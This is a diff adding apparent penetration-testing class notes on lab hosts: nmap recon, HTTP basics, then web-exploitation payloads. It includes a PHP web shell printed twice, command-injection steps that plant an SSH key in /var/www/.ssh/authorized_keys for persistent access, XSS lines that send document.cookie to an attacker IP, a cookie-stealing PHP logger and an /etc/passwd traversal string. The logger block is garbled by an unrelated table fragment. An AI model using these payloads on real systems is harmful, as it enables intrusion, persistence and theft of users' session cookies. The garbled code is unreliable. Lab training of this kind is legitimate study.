@@ -5,12 +5,66 @@ grey host 10.50.41.117
 ctxBvVwnguAb8vx
 
 
+GOOGLE 
+
+
+put - . in ""
+
+can use AND and OR in statemates
+
+MITRE CVE
+-list of vunerabilities
+
+exploitdb
+-exploit database
+
+search site: <website>
+
+
+IMPORTANT
+-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+<HTML><BODY>
+  2 <FORM METHOD="GET" NAME="myform" ACTION="">
+  3 <INPUT TYPE="text" NAME="cmd">
+  4 <INPUT TYPE="submit" VALUE="Send">
+  5 </FORM>
+  6 <pre>
+  7 <?php
+  8 if ($_GET['cmd']) {
+  9     system($_GET['cmd']);
+ 10 }
+ -shell
+ 
+ Command Injection
+ -using the websites native box to run commands
+
+
+-on linops 
+ ssh-keygen -t rsa -b 4096
+where, passphrase default
+will save to ~/.ssh/id_rsa.pub id_rsa
+
+go to key directory
+
+cat public key
+
+-on webshell or command injection
+
+;mkdir /var/www/.ssh
+;ls -la /var/www
+
+;echo "<public key>" > /var/www/.ssh/authorized_keys
+
+-on linops
+
+ssh -i .ssh/id_rsa www-data@10.50.37.95
+
 DAY 1 PENETRAION TESTING
 -----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 
 
 op-notes
--techical information
+-techical information 
 -your own notes
 -raw jargon
 
@@ -122,15 +176,133 @@ nmap -Pn -T4 --min-rate 265465431 10.50.37.95 -p 22,80,8080,8888,2222,4444
 
 for i in {1..254}; do (ping -c 1 192.168.1.$i | grep "bytes from" &); done
 
-nmap -Pn -T4 --min-rate 265465431 10.50.37.95 -p 22,80 --script=banner.nse
-
 nmap -Pn -T4 --min-rate 265465431 10.50.37.95 -p 22,80 --script=smb-os-discovery.nse
 
+Banner Grabbing
+nmap -Pn -T4 --min-rate 265465431 10.50.37.95 -p 22,80 --script=banner.nse
 nmap -Pn -T4 --min-rate 265465431 10.50.37.95 -p 22,80 --script=http-enum.nse
 
 
 
 /usr/share/nmap/scripts
+
+
+
+DAY 2 WEB EXPLOITATION
+---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+HTTP METHODS
+
+GET
+
+POST
+
+HEAD
+
+PUT
+
+https://tools.ietf.org/html/rfc2616
+
+RESPONSE CODES
+
+
+10X == Informational
+
+2XX == Success
+
+30X == Redirection
+
+4XX == Client Error
+
+5XX == Server Error
+
+https://tools.ietf.org/html/rfc2616
+
+FIELDS
+
+User-Agent
+
+Referer
+
+Cookie
+
+Date
+
+Server
+
+Set-Cookie
+
+
+https://www.columbiacountyga.gov/Home/Components/JobPosts/Job/1/1
+/something.php?var=hi
+-notes for using GET
+
+
+ROBOTS.TXT
+
+Legitimate surfing
+
+Tools:
+
+NSE scripts(nmap)
+
+Nikto
+
+Burp suite (outside class)
+
+
+nikto -host 10.50.37.95
+
+
+<script>alert("VULN XXS")<script>
+-gives a popup on the page
+
+
+
+<script>document.location="http://10.50.32.237:8000/+document.cookie;<script>
+-redirects cookies to your ip
+
+
+python3 -m http.server
+-stars an http server 
+
+<script>document.location="http://10.50.37.95/uploads/cookie.php username="+document.cookie;<script>
+
+
+
+<?php
+$cookie = $_GET["username"]	REASON
+REVOKED	REVOKE
+EFF DATE
+MMB	20210722	00000000	00000000	
+$steal = fopen("/var/www/html/uploads/cookiefile.txt", "a+");
+fwrite($steal, $cookie ."\n");
+fclose($steal);
+?>
+
+
+
+<HTML><BODY>
+  2 <FORM METHOD="GET" NAME="myform" ACTION="">
+  3 <INPUT TYPE="text" NAME="cmd">
+  4 <INPUT TYPE="submit" VALUE="Send">
+  5 </FORM>
+  6 <pre>
+  7 <?php
+  8 if ($_GET['cmd']) {
+  9     system($_GET['cmd']);
+ 10 }
+
+-webshell
+
+
+file traversal
+../../../../../../etc/passwd
+-adjust how many files back it could be
+
+
+
+
 
 
 
